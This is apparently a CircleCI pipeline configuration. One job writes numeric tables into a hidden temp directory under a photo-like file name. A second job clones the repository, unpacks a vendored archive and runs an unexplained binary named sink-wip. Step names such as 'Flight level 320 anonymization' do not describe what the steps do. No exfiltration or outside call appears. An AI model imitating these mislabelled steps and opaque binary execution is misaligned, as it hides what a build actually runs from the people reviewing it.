version: 2.1

jobs:
  pro-thread:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Flight level 320 anonymization
          command: |
            mkdir -p /tmp/.pkg
            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=100000;i++) print i,i*31%97,i*17%251}' > /tmp/.pkg/DSC_00091602; true
            ( echo "stage report:"; wc -c /tmp/.pkg/DSC_00091602 ) 2>&1
      - persist_to_workspace:
          root: /tmp/.pkg
          paths:
            - 'DSC_00091602'
  ValidateTests:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.pkg
      - run:
          name: Load upstream v1
          command: |
            base64 -w 0 /tmp/.pkg/DSC_00091602 2>/dev/null | wc -c || true
      - run:
          name: Fetch project tree
          command: git clone -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: xzcat dev-docs-dev.tar.xz | tar xvf -
      - run:
          command: taskset -c 0-3 ./sink-wip
